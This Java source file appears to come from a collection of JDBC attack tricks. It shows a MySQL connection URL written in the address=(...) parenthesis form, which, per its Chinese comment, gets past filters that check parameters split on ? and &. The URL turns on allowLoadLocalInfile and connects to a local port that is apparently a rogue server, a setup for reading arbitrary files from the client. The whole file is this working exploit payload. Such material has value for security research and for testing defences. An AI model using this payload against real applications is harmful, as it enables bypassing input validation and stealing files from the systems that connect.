package com.jdbc.tricks.address_block_parameter;
import java.sql.DriverManager;
import java.sql.SQLException;

/**
 * 利用括号进行传参，绕过部分防护中利用?和&取参数做的校验
 * 驱动版本：mysql-connector-java 8.0.12
 */
public class AllowLoadLocal_AddressBlockParameterBypass {

    public static void main(String[] args) throws SQLException, ClassNotFoundException {
        Class.forName("com.mysql.cj.jdbc.Driver");
        String Url = "jdbc:mysql://address=(host=127.0.0.1)(port=53897)(user=fileread_a.txt)(allowLoadLocalInfile=true)(useSSL=false)(maxAllowedPacket=65535)/";
        DriverManager.getConnection(Url);
    }
}
